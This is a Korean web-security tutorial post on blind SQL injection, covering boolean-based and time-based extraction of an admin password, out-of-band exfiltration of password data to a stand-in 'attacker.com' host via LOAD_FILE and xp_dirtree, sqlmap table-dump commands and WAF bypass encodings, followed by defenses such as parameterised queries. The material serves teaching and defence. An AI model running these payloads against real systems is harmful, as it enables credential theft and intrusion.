---
title: "블라인드 SQL 인젝션: 응답 없이 데이터 훔치기"
description: "에러 메시지가 없는 환경에서 동작하는 Boolean-based·Time-based·Out-of-Band 블라인드 SQL 인젝션의 원리와 이진 탐색 추출 기법, 그리고 WAF 우회까지 포함한 방어 전략을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-03"
archiveOrder: 6
type: "knowledge"
category: "Security"
tags: ["BlindSQLi", "SQL인젝션", "Boolean기반", "Time기반", "sqlmap", "웹보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-sql-injection/)에서 에러 메시지나 쿼리 결과가 그대로 반환되는 Classic SQL 인젝션을 다뤘다. 하지만 실제 서비스 대부분은 에러 메시지를 숨기고 구체적인 쿼리 결과를 노출하지 않는다. 그렇다고 안전한 것은 아니다. **블라인드 SQL 인젝션(Blind SQL Injection)**은 응답의 참/거짓 차이나 응답 시간 지연만으로 데이터를 추론해낸다.

## 블라인드 SQL 인젝션이란

직접적인 쿼리 결과 반환 없이 간접적 신호로 데이터를 추출하는 기법이다. "응답 코드가 200이면 조건이 참이다"처럼 Yes/No 신호를 반복 질문해 데이터를 한 글자씩 추론한다.

```
[공격자 질문] → 서버: "users 테이블의 admin 비밀번호 첫 글자가 'a'보다 큰가?"
[서버 응답]   → 200 (True) 또는 404 (False)
[공격자]      → 이진 탐색으로 범위 좁히기 → 약 7번이면 1글자 확정
[결론]        → 32자 비밀번호 = 최대 224번 요청으로 전체 추출 가능
```

## Boolean-based Blind SQLi

응답의 구조적 차이(HTTP 상태 코드, 콘텐츠 길이, 특정 키워드 존재 여부)를 참/거짓 신호로 사용한다.

```
?id=1 AND 1=1 --   → 정상 페이지 (True)
?id=1 AND 1=2 --   → 빈 페이지 또는 에러 (False)
```

이 차이를 확인한 뒤 실제 데이터를 탐색한다.

```sql
-- 비밀번호 첫 글자 ASCII 코드가 100보다 큰가?
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 100 --

-- 이진 탐색: > 100 True → > 112 True → > 118 False → > 115 True → > 116 False
-- → ASCII 116 = 't' (첫 글자 확정)
```

![블라인드 SQL 인젝션 유형](/assets/posts/websec-sql-injection-blind-types.svg)

![블라인드 SQL 인젝션 코드](/assets/posts/websec-sql-injection-blind-code.svg)

## Time-based Blind SQLi

응답 내용이 완전히 동일해도 응답 지연 시간으로 참/거짓을 구분한다.

```sql
-- MySQL: 조건이 참이면 5초 지연
?id=1 AND IF(ASCII(SUBSTRING(password,1,1))>100, SLEEP(5), 0) --

-- MSSQL: WAITFOR DELAY
?id=1; IF (ASCII(SUBSTRING((SELECT password FROM users WHERE name='sa'),1,1)) > 100) WAITFOR DELAY '0:0:5'--

-- PostgreSQL: pg_sleep
?id=1 AND (SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))>100) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin')--
```

## Out-of-Band (OOB) SQLi

응답 채널을 완전히 우회해 DNS 조회나 HTTP 요청으로 데이터를 외부로 전송한다.

```sql
-- MySQL: DNS 조회로 데이터 전달 (파일 권한 필요)
?id=1 AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\x')) --

-- MSSQL: xp_dirtree로 UNC 경로 조회
?id=1; EXEC xp_dirtree('\\attacker.com\' + (SELECT TOP 1 password FROM users) + '\path') --
```

OOB는 DB 계정에 강력한 권한이 있을 때만 가능하지만, 완전히 블라인드한 환경에서도 동작한다.

## sqlmap 자동화 탐지

실무 공격자는 sqlmap으로 블라인드 SQLi를 자동화한다. 방어자도 sqlmap을 사용해 자신의 애플리케이션을 점검해야 한다.

```bash
# 기본 탐지
sqlmap -u "https://example.com/item?id=1" --dbs

# 블라인드 전용 기법
sqlmap -u "https://example.com/item?id=1" \
  --technique=B,T \   # Boolean + Time 기법만
  --level=3 \         # 탐지 깊이
  --risk=2 \          # 위험도 (2=중간, 3=high - 주의)
  --dbms=mysql        # DB 종류 명시 시 빠름

# 특정 테이블 덤프
sqlmap -u "https://example.com/item?id=1" \
  -D mydb -T users --dump --batch
```

## WAF 우회 기법과 대응

공격자들은 WAF를 우회하기 위해 다양한 인코딩과 주석을 활용한다.

```sql
-- 대소문자 혼용
sElEcT uSer()

-- 주석 삽입
SELECT/**/username/**/FROM/**/users

-- URL 인코딩
%53%45%4C%45%43%54  → SELECT

-- 이중 인코딩 (WAF가 한 번만 디코딩할 때)
%2527  → %27 → '
```

이러한 우회 기법이 존재하므로 **WAF는 보조 방어일 뿐, Prepared Statement를 대체할 수 없다**.

## 방어 요약

```python
# 블라인드 SQLi를 포함한 모든 SQL 인젝션을 막는 단 하나의 방법
cursor.execute(
    "SELECT id FROM users WHERE username=%s AND password_hash=%s",
    (username, password_hash)
)
# 공격자가 Boolean/Time/OOB 기법을 아무리 사용해도
# 파라미터 바인딩이 적용된 쿼리는 주입이 불가능하다
```

추가 방어:
- **쿼리 실행 시간 모니터링**: 평소보다 길게 걸리는 쿼리 알림 (Time-based 조기 탐지)
- **DB 네트워크 격리**: 방화벽으로 DB 서버의 외부 통신 차단 (OOB 차단)
- **WAF**: ModSecurity + OWASP CRS로 알려진 페이로드 차단 (우회 가능하지만 장벽 높임)

블라인드 SQL 인젝션은 느리고 복잡하지만 강력하다. 에러 메시지 숨기기는 탐지를 어렵게 할 뿐, 근본적인 방어가 아니다. 다음 글에서는 NoSQL 데이터베이스에 특화된 인젝션 기법을 다룬다.

---

**지난 글:** [SQL 인젝션: 공격 원리와 방어 완전 정복](/posts/websec-sql-injection/)

**다음 글:** [NoSQL 인젝션: MongoDB와 쿼리 조작 공격](/posts/websec-nosql-injection/)

<br>
읽어주셔서 감사합니다. 😊
